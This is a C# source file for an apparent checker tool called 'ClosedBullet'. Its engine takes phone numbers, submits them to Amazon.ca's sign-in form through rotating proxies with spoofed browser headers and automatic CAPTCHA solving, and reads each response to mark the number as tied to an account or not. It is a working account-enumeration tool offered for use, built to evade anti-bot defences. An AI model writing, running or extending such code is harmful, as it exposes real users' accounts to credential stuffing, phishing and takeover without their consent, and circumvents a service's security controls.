using System;
using System.Collections.Generic;
using System.Drawing;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;

namespace ClosedBullet
{
    public class EnhancedValidationEngine
    {
        private ProxyManager proxyManager;
        private CaptchaHandler captchaHandler;
        private ConfigManager configManager;
        
        public event EventHandler<string> StatusChanged;
        public event EventHandler<ValidationResult> ValidationCompleted;
        
        public EnhancedValidationEngine()
        {
            proxyManager = new ProxyManager();
            captchaHandler = new CaptchaHandler();
            configManager = new ConfigManager();
            
            // Subscribe to events
            proxyManager.ProxyStatusChanged += (s, msg) => OnStatusChanged($"[PROXY] {msg}");
            captchaHandler.CaptchaStatusChanged += (s, msg) => OnStatusChanged($"[CAPTCHA] {msg}");
            configManager.ConfigStatusChanged += (s, msg) => OnStatusChanged($"[CONFIG] {msg}");
        }
        
        // Initialize with settings
        public void Initialize(string proxyFile = null, string configFile = null)
        {
            if (!string.IsNullOrEmpty(proxyFile) && File.Exists(proxyFile))
            {
                proxyManager.LoadProxiesFromFile(proxyFile);
                OnStatusChanged($"Loaded {proxyManager.TotalProxies} proxies");
            }
            
            if (!string.IsNullOrEmpty(configFile) && File.Exists(configFile))
            {
                var config = configManager.LoadConfig(configFile);
                configManager.SetActiveConfig(config);
                OnStatusChanged($"Loaded config: {config.Name}");
            }
        }
        
        // Enhanced validation with all features
        public async Task<ValidationResult> ValidateWithFeatures(string phoneNumber)
        {
            var result = new ValidationResult
            {
                PhoneNumber = phoneNumber,
                Timestamp = DateTime.Now
            };
            
            var startTime = DateTime.Now;
            ProxyInfo currentProxy = null;
            int retryCount = 0;
            const int maxRetries = 3;
            
            while (retryCount < maxRetries)
            {
                try
                {
                    using (var request = new HttpRequest())
                    {
                        // Configure proxy if enabled
                        if (proxyManager.RotationEnabled)
                        {
                            currentProxy = proxyManager.GetNextProxy();
                            if (currentProxy != null)
                            {
                                proxyManager.ConfigureRequest(request, currentProxy);
                                OnStatusChanged($"Using proxy: {currentProxy.Host}:{currentProxy.Port}");
                            }
                        }
                        
                        // Configure request based on active config or defaults
                        ConfigureRequest(request);
                        
                        // Step 1: GET signin page
                        var signinUrl = GetSigninUrl();
                        OnStatusChanged($"[{phoneNumber}] Getting signin page...");
                        
                        var response = request.Get(signinUrl);
                        var html = HandleResponse(response, request);
                        
                        // Check for CAPTCHA
                        if (captchaHandler.DetectCaptcha(html))
                        {
                            OnStatusChanged($"[{phoneNumber}] CAPTCHA detected, attempting to solve...");
                            
                            var captchaUrl = captchaHandler.ExtractCaptchaImageUrl(html, signinUrl);
                            if (!string.IsNullOrEmpty(captchaUrl))
                            {
                                // Convert CookieStorage to CookieContainer for compatibility
                                var captchaImage = captchaHandler.DownloadCaptchaImage(captchaUrl, null);
                                var captchaSolution = captchaHandler.SolveCaptcha(captchaImage);
                                
                                if (!string.IsNullOrEmpty(captchaSolution))
                                {
                                    OnStatusChanged($"[{phoneNumber}] CAPTCHA solved: {captchaSolution}");
                                    // Add CAPTCHA solution to form data
                                    // This would be included in the POST request
                                }
                                else
                                {
                                    result.Status = "BLOCKED";
                                    result.Reason = "Failed to solve CAPTCHA";
                                    result.DetectionPattern = "CAPTCHA";
                                    
                                    if (currentProxy != null)
                                    {
                                        proxyManager.MarkProxyAsDead(currentProxy);
                                    }
                                    
                                    retryCount++;
                                    continue;
                                }
                            }
                        }
                        
                        // Extract tokens
                        var tokens = ExtractTokens(html);
                        
                        // Step 2: POST phone number
                        OnStatusChanged($"[{phoneNumber}] Submitting phone number...");
                        
                        var postData = BuildPostData(phoneNumber, tokens);
                        request.Referer = signinUrl;
                        request.AddHeader("Origin", "https://www.amazon.ca");
                        
                        var submitResponse = request.Post("https://www.amazon.ca/ap/signin", postData, 
                            "application/x-www-form-urlencoded");
                        
                        var responseHtml = HandleResponse(submitResponse, request);
                        
                        // Analyze response with config patterns
                        var analysis = AnalyzeWithConfig(phoneNumber, responseHtml);
                        result.Status = analysis.Status;
                        result.Reason = analysis.Reason;
                        result.DetectionPattern = analysis.Pattern;
                        
                        // Mark proxy as working if successful
                        if (currentProxy != null && result.Status != "ERROR")
                        {
                            var responseTime = (long)(DateTime.Now - startTime).TotalMilliseconds;
                            proxyManager.MarkProxyAsWorking(currentProxy, responseTime);
                        }
                        
                        result.ResponseTimeMs = (long)(DateTime.Now - startTime).TotalMilliseconds;
                        
                        OnValidationCompleted(result);
                        return result;
                    }
                }
                catch (ProxyException pex)
                {
                    OnStatusChanged($"[{phoneNumber}] Proxy error: {pex.Message}");
                    
                    if (currentProxy != null)
                    {
                        proxyManager.MarkProxyAsDead(currentProxy);
                    }
                    
                    retryCount++;
                    
                    if (retryCount >= maxRetries)
                    {
                        result.Status = "ERROR";
                        result.Reason = "Proxy failures exceeded max retries";
                        result.DetectionPattern = "ProxyError";
                    }
                }
                catch (Exception ex)
                {
                    OnStatusChanged($"[{phoneNumber}] ERROR: {ex.Message}");
                    
                    retryCount++;
                    
                    if (retryCount >= maxRetries)
                    {
                        result.Status = "ERROR";
                        result.Reason = ex.Message;
                        result.DetectionPattern = "Error";
                    }
                }
                
                // Wait before retry
                if (retryCount < maxRetries)
                {
                    await Task.Delay(2000 * retryCount); // Progressive delay
                }
            }
            
            result.ResponseTimeMs = (long)(DateTime.Now - startTime).TotalMilliseconds;
            OnValidationCompleted(result);
            return result;
        }
        
        private void ConfigureRequest(HttpRequest request)
        {
            var config = configManager.ActiveConfig;
            
            // Basic configuration
            request.UserAgent = config?.Headers?.ContainsKey("User-Agent") == true ? 
                config.Headers["User-Agent"] : 
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
            
            request.KeepAlive = true;
            request.AllowAutoRedirect = config?.FollowRedirects ?? false;
            request.ConnectTimeout = config?.Timeout ?? 15000;
            request.ReadWriteTimeout = config?.Timeout ?? 15000;
            request.Cookies = new CookieStorage();
            
            // Add headers from config
            if (config?.Headers != null)
            {
                foreach (var header in config.Headers)
                {
                    if (header.Key != "User-Agent") // Already set
                    {
                        request.AddHeader(header.Key, header.Value);
                    }
                }
            }
            else
            {
                // Default headers
                request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
                request.AddHeader("Accept-Language", "en-US,en;q=0.9");
                request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                request.AddHeader("Upgrade-Insecure-Requests", "1");
            }
        }
        
        private string GetSigninUrl()
        {
            var config = configManager.ActiveConfig;
            
            if (!string.IsNullOrEmpty(config?.Url))
            {
                return config.Url;
            }
            
            // Default Amazon URL
            return "https://www.amazon.ca/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.ca%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=caflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
        }
        
        private string HandleResponse(HttpResponse response, HttpRequest request)
        {
            // Handle redirects
            while (response.StatusCode == HttpStatusCode.Redirect || 
                   response.StatusCode == HttpStatusCode.MovedPermanently ||
                   response.StatusCode == HttpStatusCode.Found)
            {
                var location = response.Location;
                if (string.IsNullOrEmpty(location)) break;
                
                response = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
            }
            
            return response.ToString();
        }
        
        private Dictionary<string, string> ExtractTokens(string html)
        {
            var tokens = new Dictionary<string, string>();
            
            tokens["appActionToken"] = ExtractValue(html, "name=\"appActionToken\" value=\"", "\"");
            tokens["appAction"] = ExtractValue(html, "name=\"appAction\" value=\"", "\"");
            tokens["prevRID"] = ExtractValue(html, "name=\"prevRID\" value=\"", "\"");
            tokens["workflowState"] = ExtractValue(html, "name=\"workflowState\" value=\"", "\"");
            tokens["subPageType"] = ExtractValue(html, "name=\"subPageType\" value=\"", "\"");
            tokens["openid.return_to"] = ExtractValue(html, "name=\"openid.return_to\" value=\"", "\"");
            tokens["metadata1"] = ExtractValue(html, "name=\"metadata1\" value=\"", "\"");
            
            return tokens;
        }
        
        private string BuildPostData(string phoneNumber, Dictionary<string, string> tokens)
        {
            var config = configManager.ActiveConfig;
            
            // Use config post data if available
            if (!string.IsNullOrEmpty(config?.PostData))
            {
                return config.PostData.Replace("<USER>", phoneNumber);
            }
            
            // Default post data
            var formData = new StringBuilder();
            
            foreach (var token in tokens)
            {
                if (!string.IsNullOrEmpty(token.Value))
                {
                    formData.Append($"{token.Key}={Uri.EscapeDataString(token.Value)}&");
                }
            }
            
            formData.Append($"email={phoneNumber}&password=&create=0");
            
            return formData.ToString();
        }
        
        private (string Status, string Reason, string Pattern) AnalyzeWithConfig(string phoneNumber, string html)
        {
            var config = configManager.ActiveConfig;
            
            // Use config patterns if available
            if (config != null)
            {
                // Check ban patterns first
                foreach (var pattern in config.BanKeys)
                {
                    if (html.Contains(pattern))
                    {
                        return ("BLOCKED", $"Matched ban pattern: {pattern}", pattern);
                    }
                }
                
                // Check success patterns
                foreach (var pattern in config.SuccessKeys)
                {
                    if (html.Contains(pattern))
                    {
                        return ("VALID", $"Matched success pattern: {pattern}", pattern);
                    }
                }
                
                // Check failure patterns
                foreach (var pattern in config.FailureKeys)
                {
                    if (html.Contains(pattern))
                    {
                        return ("INVALID", $"Matched failure pattern: {pattern}", pattern);
                    }
                }
                
                // Check retry patterns
                foreach (var pattern in config.RetryKeys)
                {
                    if (html.Contains(pattern))
                    {
                        return ("RETRY", $"Matched retry pattern: {pattern}", pattern);
                    }
                }
            }
            
            // Fallback to default analysis
            return DefaultAnalyze(phoneNumber, html);
        }
        
        private (string Status, string Reason, string Pattern) DefaultAnalyze(string phoneNumber, string html)
        {
            // Check for captcha/blocking first
            if (html.Contains("captcha") || html.Contains("CAPTCHA") || 
                html.Contains("automated access") || html.Contains("robot"))
            {
                return ("BLOCKED", "Captcha/Bot detection", "Captcha");
            }
            
            // Check for OTP challenge
            bool hasOTPChallenge = html.Contains("Send OTP") || 
                                   html.Contains("OTPChallengeOptions") ||
                                   html.Contains("One Time Password") ||
                                   html.Contains("multi-factor authentication") ||
                                   html.Contains("two-step verification");
            
            // Check for password field
            bool hasPasswordField = Regex.IsMatch(html, @"<input[^>]*type\s*=\s*[""']password[""'][^>]*id\s*=\s*[""']ap_password[""'][^>]*>", RegexOptions.IgnoreCase);
            bool hasEnterPasswordText = html.Contains("Enter your password");
            
            // Check for error messages
            bool hasCannotFindError = html.Contains("We cannot find an account") || 
                                      html.Contains("We can't find an account");
            bool hasWrongInvalidError = html.Contains("Wrong or Invalid") || 
                                        html.Contains("There was a problem");
            bool hasNoAccountError = html.Contains("No account found");
            bool hasCreateAccount = html.Contains("Create your Amazon account");
            
            // Determine result
            if (hasOTPChallenge)
            {
                return ("VALID", "OTP challenge shown - account exists with extra security", "OTPChallenge");
            }
            else if (hasPasswordField && hasEnterPasswordText)
            {
                return ("VALID", "Password field shown - account exists", "PasswordField");
            }
            else if (hasCannotFindError || hasWrongInvalidError || hasNoAccountError)
            {
                return ("INVALID", "Error message - no account found", "ErrorMessage");
            }
            else if (hasCreateAccount && !hasPasswordField)
            {
                return ("INVALID", "Redirected to create account", "CreateAccount");
            }
            else
            {
                return ("UNKNOWN", "Could not determine from response", "Unknown");
            }
        }
        
        private string ExtractValue(string html, string start, string end)
        {
            try
            {
                int startIndex = html.IndexOf(start);
                if (startIndex == -1) return "";
                startIndex += start.Length;
                int endIndex = html.IndexOf(end, startIndex);
                if (endIndex == -1) return "";
                return html.Substring(startIndex, endIndex - startIndex);
            }
            catch
            {
                return "";
            }
        }
        
        // Public properties for UI access
        public ProxyManager ProxyManager => proxyManager;
        public CaptchaHandler CaptchaHandler => captchaHandler;
        public ConfigManager ConfigManager => configManager;
        
        protected virtual void OnStatusChanged(string status)
        {
            StatusChanged?.Invoke(this, status);
        }
        
        protected virtual void OnValidationCompleted(ValidationResult result)
        {
            ValidationCompleted?.Invoke(this, result);
        }
    }
}